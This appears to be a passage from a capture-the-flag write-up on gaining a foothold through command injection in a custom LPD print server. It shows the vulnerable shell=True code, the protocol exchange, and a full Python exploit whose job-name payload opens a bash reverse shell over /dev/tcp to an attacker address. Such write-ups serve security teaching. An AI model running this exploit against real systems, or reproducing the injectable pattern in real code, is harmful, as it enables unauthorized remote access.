Phase 2: Foothold — LPD Command Injection
The Vulnerable Code
# /opt/LPDServer/server.py
job_name = "Unknown"
for line in decoded_content.split('\n'):
    line = line.strip()
    if line.startswith('J'):
        job_name = line[1:]
        break

subprocess.Popen(f"echo 'Archive: {job_name}' >> /tmp/archive.log", shell=True)
#                                            ^              ^
#                                            |              |
#                                   breakout point     trailing comment

The J field (job name) is interpolated directly into a shell command. The single quote after Archive: is the breakout point.

The LPD Binary Protocol
┌─────────────────────────────────────────────────────────────────────┐
│  1. Client → Server:  \x02 + "archive_intake" + \n                  │
│     Server → Client:  \x00 (accepted) or \x01 (rejected)            │
│                                                                    │
│  2. Client → Server:  \x02 + <size> + "cfA001" + <user> + \n       │
│     Server → Client:  \x00 (ack)                                    │
│                                                                    │
│  3. Client → Server:  <control file bytes> + \x00                  │
│     Server → Client:  \x00 (ack)                                    │
│                                                                    │
│  4. Client → Server:  \x03 + <data file> + \x00  (optional)        │
│     Server → Client:  \x00 (ack)                                    │
└─────────────────────────────────────────────────────────────────────┘

The control file format:

H<user>\n
J<job_name>\n

The Exploit Script
#!/usr/bin/env python3
import socket

TARGET_IP = "10.129.248.117"
TARGET_PORT = 1515
ATTACKER_IP = "10.10.14.27"
ATTACKER_PORT = 9001

# Breakout: close the single quote, inject bash reverse shell,
# then # comments out the trailing >> /tmp/archive.log
cmd = f"'; bash -c 'bash -i >& /dev/tcp/{ATTACKER_IP}/{ATTACKER_PORT} 0>&1' #"

# Control file: H field (user) + J field (job name = our payload)
control = f"Hattacker\nJ{cmd}\n"

# Header: \x02 + size + "cfA001" + username + \n
header = f"\x02{len(control)} cfA001attacker\n".encode()

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((TARGET_IP, TARGET_PORT))

# Step 1: Request queue
s.send(b'\x02archive_intake\n')
r = s.recv(1)
assert r == b'\x00', f"Queue rejected: {r!r}"

# Step 2: Send control file header
s.send(header)
s.recv(1)

# Step 3: Send control file body (triggers injection)
s.send(control.encode() + b'\x00')
s.recv(1)
s.close()
print(f"[+] Payload sent. Check listener on :{ATTACKER_PORT}")

What the shell executes:

echo 'Archive: '; bash -c 'bash -i >& /dev/tcp/10.10.14.27/9001 0>&1' #' >> /tmp/archive.log
#                ^  ^                                              ^
#                |  |                                              |
#                |  |                                              └── comments out the rest
#                |  └── reverse shell to attacker
#                └── closes the echo string

Result: Interactive shell as lp (uid=7, home=/var/spool/lpd)

